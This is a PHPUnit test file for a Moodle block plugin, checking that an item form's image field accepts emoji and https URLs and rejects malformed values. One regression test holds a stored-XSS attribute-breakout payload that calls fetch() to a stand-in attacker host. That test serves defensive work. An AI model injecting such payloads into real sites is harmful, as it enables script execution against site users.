<?php
// This file is part of Moodle - https://moodle.org/
//
// Moodle is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// Moodle is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with Moodle.  If not, see <https://www.gnu.org/licenses/>.

/**
 * Tests for the item editing form.
 *
 * @package    block_playerhud
 * @category   test
 * @copyright  2026 Jean Lúcio
 * @license    https://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
 */

namespace block_playerhud\form;

use advanced_testcase;

/**
 * Tests for edit_item_form's server-side validation.
 *
 * @package    block_playerhud
 * @copyright  2026 Jean Lúcio
 * @license    https://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
 * @covers     \block_playerhud\form\edit_item_form
 */
final class edit_item_form_test extends advanced_testcase {
    /**
     * Builds a form instance with the minimal customdata definition() needs.
     *
     * @return edit_item_form
     */
    protected function make_form(): edit_item_form {
        return new edit_item_form(null, ['instanceid' => 0, 'lp_activities' => [], 'itemid' => 0]);
    }

    /**
     * Base valid submission data, minus the field under test.
     *
     * @return array Submitted data.
     */
    protected function base_data(): array {
        return [
            'name' => 'Trophy',
            'xp' => 10,
            'image' => '🏆',
        ];
    }

    /**
     * A plain emoji value must pass validation untouched.
     */
    public function test_emoji_value_passes(): void {
        $this->resetAfterTest();

        $errors = $this->make_form()->validation($this->base_data(), []);

        $this->assertArrayNotHasKey('image', $errors);
    }

    /**
     * A well-formed https image URL must pass validation.
     */
    public function test_valid_https_url_passes(): void {
        $this->resetAfterTest();

        $data = $this->base_data();
        $data['image'] = 'https://example.com/trophy.png';
        $errors = $this->make_form()->validation($data, []);

        $this->assertArrayNotHasKey('image', $errors);
    }

    /**
     * The attribute-breakout XSS payload from the security audit PoC must be rejected.
     *
     * Regression test for the stored XSS fixed in filter_collect.js/manage_drops.js, where
     * item.image was interpolated raw into an <img src="..."> string. PARAM_URL strips the
     * embedded double quote, so clean_param() no longer round-trips the value unchanged.
     */
    public function test_attribute_breakout_payload_is_rejected(): void {
        $this->resetAfterTest();

        $data = $this->base_data();
        $data['image'] = 'http://x.png" onerror="fetch(\'https://attacker.tld/c\')';
        $errors = $this->make_form()->validation($data, []);

        $this->assertArrayHasKey('image', $errors);
    }

    /**
     * A value that starts with "http" but is not a well-formed URL (e.g. embedded spaces)
     * must also be rejected, not just quote-breakout payloads.
     */
    public function test_malformed_http_value_is_rejected(): void {
        $this->resetAfterTest();

        $data = $this->base_data();
        $data['image'] = 'http:// bad url';
        $errors = $this->make_form()->validation($data, []);

        $this->assertArrayHasKey('image', $errors);
    }
}
